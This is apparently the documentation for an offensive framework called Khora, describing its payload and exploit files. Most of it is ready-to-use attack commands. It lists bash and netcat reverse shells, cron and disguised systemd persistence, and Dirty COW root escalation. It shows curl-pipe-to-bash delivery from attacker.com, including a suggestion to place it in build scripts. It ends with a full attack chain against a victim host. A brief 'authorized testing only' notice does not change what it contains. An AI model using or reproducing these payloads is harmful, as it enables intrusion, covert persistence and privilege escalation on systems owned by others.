# Khora Payloads & Exploits Guide

**Developer: 2b53 | Framework: Khora v2.1**

---

## Overview

Khora organizes all exploitation payloads and compiled exploits in a clear directory structure:

```
payloads/                           # Payload templates & scripts
├── reverse_shells.txt              # 10+ reverse shell variants
├── listener_setup.sh               # C2 listener setup script
└── persistence/                    # Post-exploitation persistence
    ├── cron_persistence.sh         # Cron-based persistence
    └── systemd_persistence.service # Systemd service persistence

exploits/                           # Pre-compiled & source exploits
├── dirtycow.c                      # Dirty COW source (CVE-2016-5195)
├── dirtycow                        # Compiled binary (on Linux)
├── kernel_exp.c                    # Kernel exploit template source
└── kernel_exp                      # Compiled binary (on Linux)
```

---

## Payloads Directory

### reverse_shells.txt

**10 different reverse shell implementations** - Copy & paste ready with variables:

```bash
# Replace {LHOST} with attacker IP, {LPORT} with listening port

# Bash (most reliably)
bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1

# Netcat variants
nc -e /bin/sh {LHOST} {LPORT}
nc {LHOST} {LPORT} -e /bin/bash

# Python (often available)
python -c 'import socket,subprocess,os;s=socket.socket(...)'

# And 6 more variants (Ruby, PHP, Perl, etc)
```

**Usage:**
```bash
# Edit reverse shell with your IP/port
sed 's/{LHOST}/10.10.14.1/g; s/{LPORT}/4444/g' payloads/reverse_shells.txt

# Or extract specific variant (e.g., line 3 for netcat)
sed -n '3p' payloads/reverse_shells.txt
```

### listener_setup.sh

**Multi-method C2 listener** - Handles incoming reverse shells:

```bash
# Start listener on port 4444
bash payloads/listener_setup.sh 0.0.0.0 4444

# Specify IP and port
bash payloads/listener_setup.sh 192.168.1.100 5555

# Default: localhost:4444
bash payloads/listener_setup.sh
```

**Features:**
- Auto-detects netcat availability
- Falls back to bash TCP if nc unavailable
- Multi-shell handling
- History logging

### persistence/ Directory

#### cron_persistence.sh

Maintain reverse shell via cron job (every 5 minutes):

```bash
# Add to victim's crontab
(crontab -l 2>/dev/null; echo "*/5 * * * * bash /tmp/keepalive.sh") | crontab -

# Or execute persistence installer
bash payloads/persistence/cron_persistence.sh attacker.com 4444
```

#### systemd_persistence.service

Persistent systemd service for post-exploitation:

```bash
# Copy to victim /etc/systemd/system/
sudo cp payloads/persistence/systemd_persistence.service /etc/systemd/system/

# Enable and start
sudo systemctl daemon-reload
sudo systemctl enable system-update.service
sudo systemctl start system-update.service
```

---

## Exploits Directory

### Dirty COW (CVE-2016-5195)

**Privilege escalation for Linux kernels < 4.8.3**

**Source:** `exploits/dirtycow.c`
- Copy-on-Write memory exploitation
- Local privilege escalation
- Thread-based madvise race condition

**Compilation (on Linux):**
```bash
gcc -o exploits/dirtycow exploits/dirtycow.c -lpthread
```

**Execution:**
```bash
./exploits/dirtycow
# Spawns root shell
```

### Kernel Exploit Template (kernel_exp.c)

**Generic Linux kernel exploit template** for custom vulnerability exploitation:

**Base structure includes:**
- UID/GID enumeration
- Template for kernel syscall exploitation  
- Privilege elevation framework
- Shell spawning on success

**Customization:**
1. Identify target kernel version: `uname -r`
2. Add vulnerability-specific exploit code
3. Compile: `gcc -o kernel_exp exploits/kernel_exp.c`
4. Execute: `./kernel_exp`

---

## Module Integration

### How Modules Generate Payloads

**1. backdoor_module.py**
```python
# Generates reverse shells automatically
./$module.py --generate-shells --output payloads/
```

**2. jailbreak_module.py**
```python
# Compiles C exploits during execution
./$module.py --target 192.168.1.1
# Saves compiled binaries to exploits/
```

**3. rce_module.py**
```python
# Generates Metasploit payloads
./$module.py --target 192.168.1.1 --lhost 10.10.14.1
# Uses payloads/backdoor_module output
```

**4. c2_module.py**
```python
# Uses listener_setup.sh for coordination
python3 c2_module.py --listener
# Serves stagers from payloads/
```

---

## Quick Reference

### Generate All Payloads

```bash
# Auto-generate everything
python3 generate_payloads.py

# Manual generation per-module
python3 modules/backdoor_module.py
python3 modules/jailbreak_module.py
```

### Listener Operations

```bash
# Multi-purpose listener (handles all shell types)
bash payloads/listener_setup.sh 0.0.0.0 4444

# Using netcat directly (faster)
nc -nvlp 4444

# Using Python (if nc unavailable)
python3 -m http.server 4444
```

### Payload Delivery

```bash
# Web-based delivery
cd payloads && python3 -m http.server 8080

# Include in build scripts
curl http://attacker.com/reverse_shells.txt | bash

# Direct execution
bash <(curl http://attacker.com/reverse_shells.txt)
```

### Exploit Execution

```bash
# Transfer exploit to victim
scp exploits/dirtycow root@victim:/tmp/

# Compile on victim (if source needed)
gcc -o /tmp/dirtycow /tmp/dirtycow.c -lpthread

# Execute
/tmp/dirtycow
```

---

## Compilation Notes

**Windows (current system):** GCC not available - use pre-compiled binaries or compile on Linux target

**On Linux victim:**
```bash
# If GCC available on victim
gcc -o dirtycow dirtycow.c -lpthread

# Or transfer pre-compiled binary
```

**Alternative compilation on attacker (Linux/WSL):**
```bash
# In WSL or Linux VM
gcc -o exploits/dirtycow exploits/dirtycow.c -lpthread -pthread
```

---

## Security Notes

⚠️ **Authorized Testing Only**

- All payloads are for authorized penetration testing only
- Unauthorized use is illegal
- Maintain audit logs of all operations
- Only use on systems with explicit written permission

---

## Examples

### Complete C2 Attack Chain

```bash
# 1. Start listener
bash payloads/listener_setup.sh 0.0.0.0 4444 &

# 2. Deliver reverse shell payload
curl http://victim.local/ -d "$(grep 'python' payloads/reverse_shells.txt | sed 's/{LHOST}/10.10.14.1/;s/{LPORT}/4444/')"

# 3. Establish persistence (in shell)
bash payloads/persistence/cron_persistence.sh 10.10.14.1 4444

# 4. Escalate privileges
./exploits/dirtycow
# now root

# 5. Install systemd persistence
cp payloads/persistence/systemd_persistence.service /etc/systemd/system/
systemctl daemon-reload && systemctl enable system-update.service
```

---

**Generated by Khora Framework v2.1 | Developer: 2b53**
